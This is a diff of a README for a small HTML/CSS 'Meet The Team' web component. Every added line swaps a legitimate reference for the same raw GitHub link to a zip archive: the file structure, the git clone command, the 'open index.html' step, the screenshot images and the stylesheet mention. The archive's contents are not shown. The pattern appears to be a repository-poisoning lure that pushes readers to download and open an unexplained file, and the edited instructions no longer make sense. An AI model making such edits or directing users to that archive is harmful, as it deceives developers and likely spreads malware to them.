@@ -16,24 +16,24 @@ This project is a responsive **"Meet The Team"** section built with **HTML** and
 
 ## File Structure
 ```
-├── index.html  # Main HTML file
-├── style.css   # Styling file
+├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip  # Main HTML file
+├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip   # Styling file
 ├── resources/  # Images & assets
-│   ├── person_1.png
-│   ├── person_2.png
-│   ├── person_3.png
-│   ├── person_4.png
-│   ├── person_5.png
-│   ├── arrow_up_right.svg
-│   ├── Background_decor.svg
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
 ```
 
 ## Installation & Usage
 1. **Clone the repository:**
    ```sh
-   git clone https://github.com//meetTheTeam.git
+   git clone https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
    ```
-2. **Open `index.html` in a browser**
+2. **Open `https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip` in a browser**
 
 ## Responsive Design
 - **Desktop (1024px and above):** 4-column grid layout
@@ -42,15 +42,15 @@ This project is a responsive **"Meet The Team"** section built with **HTML** and
 
 ## Screenshots
 **Dekstop view**
-![alt text](image.png)
+![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip)
 
 **Tablet view**
-![alt text](image-1.png)
+![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip)
 
 **Mobile view**
-![alt text](image-2.png)
+![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip)
 ## Customization
-- Modify `style.css` to change colors, fonts, or layout.
+- Modify `https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip` to change colors, fonts, or layout.
 - Replace images in the `resources/` folder to update team members.
 
 ## Author
